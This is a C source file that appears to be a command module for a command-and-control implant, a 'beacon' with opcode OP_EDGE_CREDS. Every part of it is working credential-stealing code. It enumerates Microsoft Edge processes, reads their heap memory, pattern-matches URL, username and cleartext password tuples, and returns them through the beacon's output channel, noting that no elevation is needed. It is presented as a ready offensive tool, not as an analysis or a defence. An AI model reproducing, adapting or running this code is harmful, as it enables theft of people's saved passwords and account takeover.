// Dump cleartext passwords from Microsoft Edge process memory.
// Edge stores all saved credentials in cleartext in the browser process heap,
// even if the user hasn't visited those sites in the current session.
// Technique: ISC SANS Diary 32954 (2025).
//
// Mechanism:
//   1. Enumerate processes → find msedge.exe PIDs
//   2. OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)
//   3. VirtualQueryEx → find committed readable pages
//   4. ReadProcessMemory → scan for credential patterns
//   5. Pattern: URL\0protocol\0username\0password\0
//
// No elevation required — works as the same user who runs Edge.

#include <windows.h>
#include <tlhelp32.h>
#include "../core/beacon.h"

// ---- helpers ----------------------------------------------------------------

static void out_str(const char* s) { out_write(s, rt_strlen(s)); }

static int rt_strcmp(const char* a, const char* b) {
    while (*a && *a == *b) { a++; b++; }
    return (unsigned char)*a - (unsigned char)*b;
}

static int rt_strncmp(const char* a, const char* b, size_t n) {
    for (size_t i = 0; i < n; i++) {
        if (a[i] != b[i]) return (unsigned char)a[i] - (unsigned char)b[i];
        if (!a[i]) return 0;
    }
    return 0;
}

static size_t rt_strnlen(const char* s, size_t max) {
    size_t n = 0;
    while (n < max && s[n]) n++;
    return n;
}

// Case-insensitive comparison for process name (wchar_t)
static int wstr_ieq(const wchar_t* a, const wchar_t* b) {
    while (*a && *b) {
        wchar_t ca = *a, cb = *b;
        if (ca >= L'A' && ca <= L'Z') ca += 32;
        if (cb >= L'A' && cb <= L'Z') cb += 32;
        if (ca != cb) return 0;
        a++; b++;
    }
    return *a == *b;
}

// Check if a byte sequence looks like a printable ASCII string (URL, username, etc.)
static int is_printable_ascii(const char* s, size_t len) {
    for (size_t i = 0; i < len; i++) {
        unsigned char c = (unsigned char)s[i];
        if (c < 0x20 || c > 0x7E) return 0;
    }
    return 1;
}

// Check if string looks like an email/username (contains @ or alphanumeric)
static int looks_like_username(const char* s, size_t len) {
    if (len < 2 || len > 128) return 0;
    int has_alnum = 0;
    for (size_t i = 0; i < len; i++) {
        char c = s[i];
        if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
            (c >= '0' && c <= '9') || c == '@' || c == '.' || c == '_' ||
            c == '-' || c == '+')
            has_alnum = 1;
        else
            return 0;
    }
    return has_alnum;
}

// Check if string looks like a password (printable, reasonable length)
static int looks_like_password(const char* s, size_t len) {
    if (len < 1 || len > 256) return 0;
    return is_printable_ascii(s, len);
}

// ---- credential pattern scanner -------------------------------------------
// Edge (Chromium) stores credentials in heap as sequences of NUL-terminated
// UTF-8 strings. The pattern found by scanning memory dumps:
//   <url>\0<scheme>\0<username>\0<password>\0
// Where:
//   url      = "https://example.com" or "https://example.com/login"
//   scheme   = "https" or "http"
//   username = email or login
//   password = cleartext password
//
// We scan for "https://" or "http://" markers, then check if the subsequent
// NUL-terminated strings form a valid credential tuple.

#define SCAN_MAX_URL_LEN   512
#define SCAN_MAX_FIELD_LEN 256
#define SCAN_PAGE_SIZE     (64 * 1024)  // read 64KB chunks

typedef struct Credential {
    char url[SCAN_MAX_URL_LEN];
    char username[SCAN_MAX_FIELD_LEN];
    char password[SCAN_MAX_FIELD_LEN];
} Credential;

// De-duplication: keep list of already-found credentials to avoid repeats
#define MAX_CREDS 512

typedef struct CredList {
    Credential items[MAX_CREDS];
    int count;
} CredList;

static int cred_exists(const CredList* list, const char* url, const char* user) {
    for (int i = 0; i < list->count; i++) {
        if (rt_strcmp(list->items[i].url, url) == 0 &&
            rt_strcmp(list->items[i].username, user) == 0)
            return 1;
    }
    return 0;
}

// Scan a memory buffer for credential patterns.
// Returns number of credentials found.
static int scan_buffer(const uint8_t* buf, size_t buf_len, CredList* creds) {
    int found = 0;

    for (size_t i = 0; i + 10 < buf_len; i++) {
        // Look for "https://" or "http://"
        if (buf[i] != 'h') continue;

        int is_https = 0;
        if (i + 8 < buf_len && rt_strncmp((const char*)buf + i, "https://", 8) == 0)
            is_https = 1;
        else if (i + 7 < buf_len && rt_strncmp((const char*)buf + i, "http://", 7) == 0)
            is_https = 0;
        else
            continue;

        // Found URL start — extract it (NUL-terminated)
        const char* url_start = (const char*)buf + i;
        size_t url_len = rt_strnlen(url_start, buf_len - i);
        if (url_len < 10 || url_len >= SCAN_MAX_URL_LEN) { i += url_len; continue; }
        if (!is_printable_ascii(url_start, url_len)) { i += url_len; continue; }

        // After the URL NUL, expect: scheme\0username\0password\0
        size_t pos = i + url_len + 1;  // skip URL + NUL

        // Next string: should be "https" or "http" (scheme)
        if (pos >= buf_len) break;
        const char* field1 = (const char*)buf + pos;
        size_t f1_len = rt_strnlen(field1, buf_len - pos);

        int scheme_match = 0;
        if ((f1_len == 5 && rt_strncmp(field1, "https", 5) == 0) ||
            (f1_len == 4 && rt_strncmp(field1, "http", 4) == 0))
            scheme_match = 1;

        if (!scheme_match) { i += url_len; continue; }

        // Next: username
        pos += f1_len + 1;
        if (pos >= buf_len) break;
        const char* username = (const char*)buf + pos;
        size_t u_len = rt_strnlen(username, buf_len - pos);
        if (!looks_like_username(username, u_len)) { i += url_len; continue; }

        // Next: password
        pos += u_len + 1;
        if (pos >= buf_len) break;
        const char* password = (const char*)buf + pos;
        size_t p_len = rt_strnlen(password, buf_len - pos);
        if (!looks_like_password(password, p_len)) { i += url_len; continue; }

        // Skip empty passwords
        if (p_len == 0) { i += url_len; continue; }

        // De-duplicate
        if (cred_exists(creds, url_start, username)) { i += url_len; continue; }

        // Store
        if (creds->count < MAX_CREDS) {
            Credential* c = &creds->items[creds->count];
            rt_memcpy(c->url, url_start, url_len < SCAN_MAX_URL_LEN - 1 ? url_len : SCAN_MAX_URL_LEN - 1);
            c->url[url_len < SCAN_MAX_URL_LEN - 1 ? url_len : SCAN_MAX_URL_LEN - 1] = 0;
            rt_memcpy(c->username, username, u_len < SCAN_MAX_FIELD_LEN - 1 ? u_len : SCAN_MAX_FIELD_LEN - 1);
            c->username[u_len < SCAN_MAX_FIELD_LEN - 1 ? u_len : SCAN_MAX_FIELD_LEN - 1] = 0;
            rt_memcpy(c->password, password, p_len < SCAN_MAX_FIELD_LEN - 1 ? p_len : SCAN_MAX_FIELD_LEN - 1);
            c->password[p_len < SCAN_MAX_FIELD_LEN - 1 ? p_len : SCAN_MAX_FIELD_LEN - 1] = 0;
            creds->count++;
            found++;
        }

        i += url_len;
    }
    return found;
}

// Scan a single process for Edge credentials
static int scan_process(DWORD pid, CredList* creds) {
    HANDLE hp = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hp) return 0;

    int found = 0;
    uint8_t* page_buf = (uint8_t*)bmalloc(SCAN_PAGE_SIZE);
    if (!page_buf) { CloseHandle(hp); return 0; }

    MEMORY_BASIC_INFORMATION mbi;
    uint8_t* addr = NULL;

    while (VirtualQueryEx(hp, addr, &mbi, sizeof(mbi))) {
        // Only scan committed, readable pages (skip guard, no-access, and executable)
        if (mbi.State == MEM_COMMIT &&
            !(mbi.Protect & PAGE_GUARD) &&
            !(mbi.Protect & PAGE_NOACCESS) &&
            (mbi.Protect & (PAGE_READWRITE | PAGE_READONLY |
                            PAGE_WRITECOPY | PAGE_EXECUTE_READ |
                            PAGE_EXECUTE_READWRITE))) {

            // Skip very large regions (> 16 MB) to avoid timeouts
            if (mbi.RegionSize <= 16 * 1024 * 1024) {
                size_t region_sz = mbi.RegionSize;
                size_t offset = 0;

                while (offset < region_sz) {
                    size_t to_read = region_sz - offset;
                    if (to_read > SCAN_PAGE_SIZE) to_read = SCAN_PAGE_SIZE;

                    SIZE_T bytes_read = 0;
                    if (ReadProcessMemory(hp, (uint8_t*)mbi.BaseAddress + offset,
                                          page_buf, to_read, &bytes_read) && bytes_read > 0) {
                        found += scan_buffer(page_buf, bytes_read, creds);
                    }
                    offset += to_read;

                    // Early exit if we've found enough
                    if (creds->count >= MAX_CREDS) goto done;
                }
            }
        }

        addr = (uint8_t*)mbi.BaseAddress + mbi.RegionSize;
        if (addr < (uint8_t*)mbi.BaseAddress) break;  // overflow guard
    }

done:
    bfree(page_buf);
    CloseHandle(hp);
    return found;
}

// ---- command entry point ---------------------------------------------------
// Opcode: OP_EDGE_CREDS
// Payload: none (scans all msedge.exe processes of current user)

void cmd_edge_creds(const BeaconTask* t) {
    (void)t;
    out_str("[*] scanning msedge.exe processes for cleartext credentials...\n");

    // Allocate credential list
    CredList* creds = (CredList*)bcalloc(sizeof(CredList));
    if (!creds) {
        out_str("[-] memory allocation failed\n");
        return;
    }

    // Enumerate processes, find msedge.exe
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        out_str("[-] CreateToolhelp32Snapshot failed\n");
        bfree(creds);
        return;
    }

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    int edge_pids = 0;

    if (Process32FirstW(snap, &pe)) {
        do {
            if (wstr_ieq(pe.szExeFile, L"msedge.exe")) {
                edge_pids++;
                scan_process(pe.th32ProcessID, creds);
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);

    if (edge_pids == 0) {
        out_str("[-] no msedge.exe processes found (Edge not running)\n");
        bfree(creds);
        return;
    }

    // Output results
    char numbuf[16];
    int n;

    out_str("[*] scanned ");
    n = 0; { int v = edge_pids; char t2[16]; int k = 0;
        if (!v) { numbuf[0]='0'; n=1; }
        else { while(v) { t2[k++]=(char)('0'+v%10); v/=10; } while(k) numbuf[n++]=t2[--k]; }
        numbuf[n]=0;
    }
    out_write(numbuf, (size_t)n);
    out_str(" Edge process(es)\n");

    if (creds->count == 0) {
        out_str("[*] no credentials found in memory\n");
        bfree(creds);
        return;
    }

    out_str("[+] found credentials:\n\n");

    for (int i = 0; i < creds->count; i++) {
        Credential* c = &creds->items[i];

        // Format: URL | USERNAME | PASSWORD
        out_str("  URL:  ");
        out_write(c->url, rt_strlen(c->url));
        out_str("\n  User: ");
        out_write(c->username, rt_strlen(c->username));
        out_str("\n  Pass: ");
        out_write(c->password, rt_strlen(c->password));
        out_str("\n\n");
    }

    out_str("[*] total: ");
    n = 0; { int v = creds->count; char t2[16]; int k = 0;
        if (!v) { numbuf[0]='0'; n=1; }
        else { while(v) { t2[k++]=(char)('0'+v%10); v/=10; } while(k) numbuf[n++]=t2[--k]; }
        numbuf[n]=0;
    }
    out_write(numbuf, (size_t)n);
    out_str(" credential(s)\n");

    bfree(creds);
}
